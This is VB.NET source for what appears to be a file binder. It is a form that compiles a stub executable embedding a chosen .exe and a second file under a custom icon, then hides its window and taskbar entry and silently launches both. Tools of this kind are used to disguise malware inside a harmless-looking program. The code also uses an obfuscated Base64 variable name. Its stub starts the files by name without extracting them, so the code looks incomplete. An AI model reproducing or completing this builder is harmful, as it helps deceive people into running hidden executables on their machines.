Imports System.CodeDom.Compiler

Public Class Form6
    Dim obIconFile As String
    Dim oboutfile As String = ""
    Dim obcstring() As String
    Dim obCode As String
    Dim f1 As String
    Dim f2 As String

    Public dGVzdHBhdGg As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        Dim ofdob1 As New OpenFileDialog
        ofdob1.Filter = "Exe Files|*.exe"
        If ofdob1.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox1.Text = ofdob1.FileName
            f1 = IO.Path.GetFileName(TextBox1.Text)
        Else
            Exit Sub
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click


        Dim ofdob2 As New OpenFileDialog
        ofdob2.Filter = "All Files|*.*"
        If ofdob2.ShowDialog = Windows.Forms.DialogResult.OK Then
            TextBox2.Text = ofdob2.FileName
            f2 = IO.Path.GetFileName(TextBox2.Text)
        Else
            Exit Sub
        End If
    End Sub

    Sub Compile(ByVal oboutfile As String)

        Dim codeline0 As String = "Imports System.Windows.Forms"
        Dim codeline1 As String = "Imports System"
        Dim codeline2 As String = "Imports System.Environment"
        Dim codeline3 As String = "Imports System.Net"
        Dim codeline4 As String = "Imports System.Diagnostics"
        Dim codeline5 As String = "Imports Microsoft.VisualBasic"
        Dim codeline6 As String = "Namespace Z33B"
        Dim codeline7 As String = "Public Class Initiate"
        Dim codeline8 As String = "Public Shared Sub Main(argob As [String]())"
        Dim codeline9 As String = "Dim FrmMainZ33B As New Form1"
        Dim codeline10 As String = "Application.Run(FrmMainZ33B)"
        Dim codeline11 As String = "End Sub"
        Dim codeline12 As String = "End Class"
        Dim codeline13 As String = "Public Class Form1"
        Dim codeline14 As String = "Inherits System.Windows.Forms.Form"
        Dim codeline15 As String = "Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load"
        Dim codeline16 As String = " "
        Dim codeline17 As String = "Me.Hide()"
        Dim codeline18 As String = "Me.ShowInTaskbar = False"
        Dim codeline19 As String = "Me.WindowState = FormWindowState.Minimized"
        Dim codeline20 As String = "Process.Start(""" + f1 + """)"
        Dim codeline21 As String = "Process.Start(""" + f2 + """)"
        Dim codeline22 As String = "End Sub"
        Dim codeline23 As String = "End Class"
        Dim codeline24 As String = "End Namespace"

        obcstring = New String(24) {codeline0, codeline1, codeline2, codeline3, codeline4, codeline5, codeline6, codeline7, codeline8, codeline9, codeline10, codeline11, codeline12, codeline13, codeline14, codeline15, codeline16, codeline17, codeline18, codeline19, codeline20, codeline21, codeline22, codeline23, codeline24}

        obCode = String.Join(vbNewLine, obcstring)

    End Sub


    Sub Execute(ByVal Destination As String, ByVal obResources As String())
        Dim cp2 As New CompilerParameters


        cp2.ReferencedAssemblies.Add("System.dll")
        cp2.ReferencedAssemblies.Add(dGVzdHBhdGg & "\Z33nie\System.Windows.Forms.dll")
        cp2.ReferencedAssemblies.Add(dGVzdHBhdGg & "\Z33nie\System.Drawing.dll")
        cp2.ReferencedAssemblies.Add(Application.StartupPath & "\Resources\" & "System.Core.dll")

        cp2.CompilerOptions = " /target:winexe /optimize /win32icon:" + obIconFile

        Dim Provider As New VBCodeProvider

        For Each psr As String In obResources
            cp2.EmbeddedResources.Add(psr)
        Next

        cp2.GenerateExecutable = True
        cp2.OutputAssembly = Destination
        cp2.GenerateInMemory = False

        Dim errors As System.CodeDom.Compiler.CompilerResults = Provider.CompileAssemblyFromSource(cp2, obCode)
        If errors.Errors.HasErrors Then
            MessageBox.Show(errors.Errors(0).ToString)
        End If


    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        If TextBox1.Text = "" Or TextBox2.Text = "" Then
            MsgBox("So Input File/Files specified!")
        Else
            Dim sfd As New SaveFileDialog
            sfd.Filter = "Exe Files|*.exe"

            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                oboutfile = sfd.FileName
            Else
                Exit Sub
            End If
            Dim ofd As New OpenFileDialog
            ofd.Filter = "Icon Files|*.ico"
            If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
                obIconFile = ofd.FileName
            Else
                Exit Sub
            End If
            Compile(oboutfile)
            Dim ultrcs As String() = {TextBox1.Text, TextBox2.Text}
            Execute(oboutfile, ultrcs)

            Me.Close()
        End If
    End Sub

    Private Sub Button2_MouseHover(sender As Object, e As EventArgs) Handles Button2.MouseHover
        Button2.BackColor = Color.YellowGreen
    End Sub

    Private Sub Button2_MouseLeave(sender As Object, e As EventArgs) Handles Button2.MouseLeave
        Button2.BackColor = Color.LawnGreen
    End Sub

    Private Sub Button3_MouseHover(sender As Object, e As EventArgs) Handles Button3.MouseHover
        Button3.BackColor = Color.YellowGreen
    End Sub

    Private Sub Button3_MouseLeave(sender As Object, e As EventArgs) Handles Button3.MouseLeave
        Button3.BackColor = Color.LawnGreen
    End Sub

    Private Sub Button1_MouseHover(sender As Object, e As EventArgs) Handles Button1.MouseHover
        Button1.BackColor = Color.DarkGray
    End Sub

    Private Sub Button1_MouseLeave(sender As Object, e As EventArgs) Handles Button1.MouseLeave
        Button1.BackColor = Color.Black
    End Sub
End Class